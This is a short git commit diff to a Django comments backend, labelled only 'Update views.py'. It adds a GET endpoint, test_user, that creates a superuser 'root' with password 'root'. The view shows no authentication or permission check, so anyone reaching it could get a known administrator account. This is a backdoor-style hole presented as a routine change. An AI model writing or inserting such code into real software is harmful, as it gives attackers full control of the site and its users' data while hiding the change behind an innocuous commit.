51ae361a28e4322a39662bcffe1fe8f8780cf41f
Pavlo Khomliuk <103265356+Pashokkkk@users.noreply.github.com>
2025-05-17 20:17:14 +0100

    Update views.py

--- backend/comments/views.py
+++ backend/comments/views.py
@@ -11,12 +11,21 @@ from rest_framework_simplejwt.authentication import JWTAuthentication
 from .models import UserComment
 from .serializers import UserCommentSerializer
 
+from django.contrib.auth.models import User
+
 @api_view(['GET'])
 def captcha_refresh(request):
     # Generate and return new CAPTCHA key and image URL
     new_key = CaptchaStore.generate_key()
     image_url = captcha_image_url(new_key)
     return Response({'key': new_key, 'image_url': image_url})
+
+@api_view(['GET'])
+def test_user(request):
+    if not User.objects.filter(username="root").exists():
+        User.objects.create_superuser("root", "root@example.com", "root")
+        return Response({"created": True})
+    return Response({"exists": True})
 
 class UserCommentListCreateAPIView(generics.ListCreateAPIView):
     # Handle listing and creating top-level comments
